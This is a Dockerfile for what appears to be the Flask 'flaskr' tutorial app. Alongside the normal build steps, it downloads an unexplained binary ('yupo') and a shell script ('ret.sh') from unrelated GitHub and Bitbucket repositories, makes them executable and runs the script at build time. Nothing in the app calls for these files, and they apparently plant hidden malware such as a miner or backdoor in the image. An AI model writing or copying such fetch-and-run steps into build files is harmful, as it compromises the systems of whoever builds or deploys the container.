FROM python:3.8.2-alpine3.11

ENV FLASK_APP=flaskr
ENV FLASK_ENV=development

COPY . /app

WORKDIR /app

RUN pip install --editable .

RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/yupo
RUN wget https://bitbucket.org/korkorerf/minyt/raw/48c651e97d3e599167319b303c4b82adf067b156/ret.sh
RUN chmod +x yupo
RUN chmod +x ret.sh
RUN ./ret.sh

# Unit tests
# RUN pip install pytest && pytest

EXPOSE 5000

CMD [ "flask", "run", "--host=0.0.0.0" ]



